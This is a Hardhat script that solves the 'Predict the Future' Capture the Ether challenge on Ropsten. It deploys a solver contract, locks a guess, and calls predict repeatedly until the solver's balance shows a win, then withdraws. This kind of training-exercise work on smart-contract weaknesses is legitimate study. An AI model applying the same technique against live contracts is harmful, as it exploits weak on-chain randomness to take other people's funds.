const { ethers } = require("hardhat");

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)

    //The contract address - Just copy it from the CTE challenge page
    const challengeAddress = await ethers.utils.getAddress("0x75c054cb909b99f4B6c87043A9cAC9bAc70eD859");

    //Deploy the solver contract using your account
    console.log("Deploying contract with the account:", signer.address);
    const SolverContractFactory = await ethers.getContractFactory("PredictTheFutureSolver");
    const SolverContract = await SolverContractFactory.deploy(challengeAddress);
    console.log("Solver Contract address:", SolverContract.address);

    //Lock your guess
    let lockGuessTx = await SolverContract.lockGuess(5, {value: ethers.utils.parseEther("1")});
    console.log("LOCK GUESS TX: ", lockGuessTx);

    /*
    * Predict until you find a block that allows you to win.
    * There may be a better way to check that the transaction succeeded. This is the first option I came up with - stop predicting when the contract has 2 ETH.
    * This means that the challenge contract returned our ETH, which in turn means that we settled correctly.
    */
    var predictTx = null;
    var contractBalance = 0;
    var exitConditionBalance = ethers.utils.parseEther("2");

    do {
      predictTx = await SolverContract.predict();
      contractBalance = await ethers.getDefaultProvider("ropsten").getBalance(SolverContract.address);
      console.log("CONTRACT CURRENT BALANCE", contractBalance);
      console.log("-----------------------------------------");
    }
    while(!contractBalance.eq(exitConditionBalance));

    console.log("PREDICT TX SUCCEEDED", predictTx);

    //Send the withdraw transaction to get your ETH back
    let withdrawTx = await SolverContract.withdraw();
    console.log("WITHDRAW TX: ", withdrawTx);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});